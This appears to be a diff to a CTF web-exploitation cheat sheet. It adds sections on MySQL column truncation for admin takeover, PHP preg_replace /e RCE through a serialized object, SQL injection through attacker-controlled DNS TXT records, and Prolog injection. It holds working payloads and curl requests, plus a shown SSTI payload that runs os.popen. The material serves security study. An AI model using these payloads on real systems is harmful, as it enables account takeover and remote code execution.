@@ -8,7 +8,8 @@
   - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
   - [Second-Order SQL Injection](#second-order-sql-injection)
   - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
-  - [SQLi → SSTI Chain](#sqli--ssti-chain)
+  - [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
+  - [SQLi to SSTI Chain](#sqli-to-ssti-chain)
   - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
   - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
   - [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
@@ -40,7 +41,10 @@
 - [ReDoS as Timing Oracle](#redos-as-timing-oracle)
 - [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
 - [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
-- [File Upload → RCE Techniques](#file-upload--rce-techniques)
+- [PHP preg_replace /e Modifier RCE (PlaidCTF 2014)](#php-preg_replace-e-modifier-rce-plaidctf-2014)
+- [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
+- [Prolog Injection (PoliCTF 2015)](#prolog-injection-polictf-2015)
+- [File Upload to RCE Techniques](#file-upload-to-rce-techniques)
   - [.htaccess Upload Bypass](#htaccess-upload-bypass)
   - [PHP Log Poisoning](#php-log-poisoning)
   - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
@@ -203,7 +207,31 @@ for pos in range(length):
             password += c; break
 ```
 
-### SQLi → SSTI Chain
+### MySQL Column Truncation (VolgaCTF 2014)
+
+**Pattern:** Registration form backed by MySQL `VARCHAR(N)`. MySQL silently truncates strings longer than N characters, and ignores trailing spaces in string comparison. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.
+
+```bash
+# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
+# MySQL truncates to "admin               " → matches "admin" in comparisons
+
+# Register duplicate admin with attacker password
+curl -X POST http://target/register -d \
+  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'
+
+# Login as admin with attacker password
+curl -X POST http://target/login -d 'login=admin&password=attacker123'
+```
+
+**Why it works:**
+1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT
+2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
+3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
+4. The application now has two rows matching "admin" — the original and the attacker's
+
+**Key insight:** MySQL's PAD SPACE collation means `"admin" = "admin     "` evaluates to true. Combined with silent `VARCHAR` truncation, registering with a space-padded username creates a second account that the application treats as the original admin. This bypasses registration duplicate checks that use `WHERE username = ?` (since the padded version isn't an exact match before truncation). Fixed in MySQL 8.0+ with `NO_PAD` collations.
+
+### SQLi to SSTI Chain
 When SQLi result gets rendered in a template:
 ```python
 payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
@@ -572,7 +600,7 @@ curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
 
 ---
 
-## File Upload → RCE Techniques
+## File Upload to RCE Techniques
 
 ### .htaccess Upload Bypass
 1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
@@ -743,3 +771,64 @@ for pos in range(1, 100):
 ```
 
 **Key insight:** XPath injection is similar to SQL injection but targets XML data stores. `normalize-space()` strips whitespace, `../../../` traverses the XML tree. Boolean oracle via response size differences (true queries return more results).
+
+---
+
+## PHP preg_replace /e Modifier RCE (PlaidCTF 2014)
+
+**Pattern:** PHP's `preg_replace()` with the `/e` modifier evaluates the replacement string as PHP code. Combined with `unserialize()` on user-controlled input, craft a serialized object whose properties trigger a code path using `preg_replace("/pattern/e", "system('cmd')", ...)`.
+
+```php
+// Vulnerable code pattern:
+preg_replace($pattern . "/e", $replacement, $input);
+// If $replacement is attacker-controlled:
+$replacement = 'system("cat /flag")';
+```
+
+**Via object injection (POP chain):**
+```php
+// Craft serialized object with OutputFilter containing /e pattern
+$filter = new OutputFilter("/^./e", 'system("cat /flag")');
+$cookie = serialize($filter);
+// Send as cookie → unserialize triggers preg_replace with /e
+```
+
+**Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables RCE through POP gadget chains that set both pattern and replacement.
+
+---
+
+## SQL Injection via DNS Records (PlaidCTF 2014)
+
+**Pattern:** Application calls `gethostbyaddr()` or `dns_get_record()` on user-controlled IP addresses and uses the result in SQL queries without escaping. Inject SQL through DNS PTR or TXT records you control.
+
+**Attack setup:**
+1. Set your IP's PTR record to a domain you control (e.g., `evil.example.com`)
+2. Add a TXT record on that domain containing the SQL payload
+3. Trigger the application to resolve your IP (e.g., via password reset)
+
+```php
+// Vulnerable code:
+$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+$details = dns_get_record($hostname);
+mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
+// TXT record: "' UNION SELECT flag FROM flags-- "
+```
+
+**Key insight:** DNS records (PTR, TXT, MX) are an overlooked injection channel. Any application that resolves IPs/hostnames and incorporates the result into database queries is vulnerable. Control comes from setting up DNS records for attacker-owned domains or IP reverse DNS.
+
+---
+
+## Prolog Injection (PoliCTF 2015)
+
+**Pattern:** Service passes user input directly into a Prolog predicate call. Close the original predicate and inject additional Prolog goals for command execution.
+
+```text
+# Original query: hanoi(USER_INPUT)
+# Injection: close hanoi(), chain exec()
+3), exec(ls('/')), write('\n'
+3), exec(cat('/flag')), write('\n'
+```
+
+**Identification:** Error messages containing "Prolog initialisation failed" or "Operator expected" reveal the backend. SWI-Prolog's `exec/1` and `shell/1` execute system commands.
+
+**Key insight:** Prolog goals are chained with `,` (AND). Injecting `3), exec(cmd)` closes the original predicate and appends arbitrary Prolog goals. Similar to SQL injection but for logic programming backends. Also check for `process_create/3` and `read_file_to_string/3` as alternatives to `exec`.
